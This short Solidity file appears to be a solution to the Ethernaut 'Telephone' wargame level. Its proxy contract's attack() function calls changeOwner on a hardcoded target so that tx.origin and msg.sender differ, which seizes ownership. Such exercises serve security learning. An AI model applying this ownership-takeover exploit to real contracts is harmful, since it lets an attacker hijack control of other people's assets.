// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Telephone.sol';

contract TelephoneProxy {

    // Telephone instance from ethernaut console
    address telephone = 0x15E2Aff6e2d3f65425AA5d1c0989daA3490c04Fa;

    function attack() public {
        Telephone(telephone).changeOwner(msg.sender);
    }
}